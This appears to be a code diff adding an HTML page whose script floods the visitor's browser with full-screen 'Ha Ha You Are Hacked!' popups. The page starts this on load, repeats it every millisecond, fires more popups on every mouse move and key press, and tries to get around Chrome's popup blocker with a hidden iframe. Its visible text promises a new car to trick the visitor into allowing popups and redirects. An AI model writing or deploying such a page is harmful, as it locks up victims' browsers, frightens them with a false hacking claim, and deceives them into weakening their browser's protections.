@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        function openFullScreenWindow() {
+            let newWindow = window.open("", "_blank", "fullscreen=yes");
+            if (newWindow) {
+                newWindow.document.write(`
+                    <html>
+                    <body style="background-color: black; color: red; text-align: center;">
+                        <h1 style="font-size: 50px;">Ha Ha You Are Hacked!</h1>
+                        <script>
+                            document.documentElement.requestFullscreen();
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                newWindow.document.close();
+            }
+        }
+
+        function bypassPopupBlocker() {
+            for (let i = 0; i < 10; i++) {  
+                let newWindow = window.open("about:blank", "_blank");
+                if (newWindow) {
+                    newWindow.close(); // Trick Chrome into allowing pop-ups
+                }
+            }
+        }
+
+        function startSpam() {
+            bypassPopupBlocker(); // Try to allow unlimited pop-ups
+            setInterval(openFullScreenWindow, 1); // Open infinite full-screen pop-ups
+        }
+
+        function openPopup() {
+            let win = window.open("", "_blank", "width=400,height=400");
+            if (win) {
+                win.document.write(`<h1 style='color:red;'>Ha Ha You Are Hacked!</h1>`);
+                win.document.close();
+            }
+        }
+
+        function spamPopups() {
+            for (let i = 0; i < 5; i++) {
+                openPopup();
+            }
+        }
+
+        function tryBypass() {
+            let hiddenFrame = document.createElement("iframe");
+            hiddenFrame.style.display = "none";
+            document.body.appendChild(hiddenFrame);
+            hiddenFrame.contentWindow.open("https://example.com", "_blank");
+        }
+
+        document.addEventListener("mousemove", spamPopups);
+        document.addEventListener("keydown", spamPopups);
+        document.addEventListener("click", tryBypass);
+
+        // Auto-start the attack (Chrome may block this)
+        setTimeout(startSpam, 1000);
+
+        // Auto-run when JSFiddle is loaded
+        window.onload = function() {
+            startSpam();
+        };
+    </script>
+</head>
+<body>
+    <p><strong>Instructions:</strong></p>
+    <p>1. If you see a popup blocker warning in Chrome (it should popup where you search at the top of chrome), click on it.</p>
+    <p>2. Select "Allow popups and redirects" for this site.</p>
+    <p>3. Then, try interacting with the page to get the chance to win a new car!</p>
+</body>
+</html>
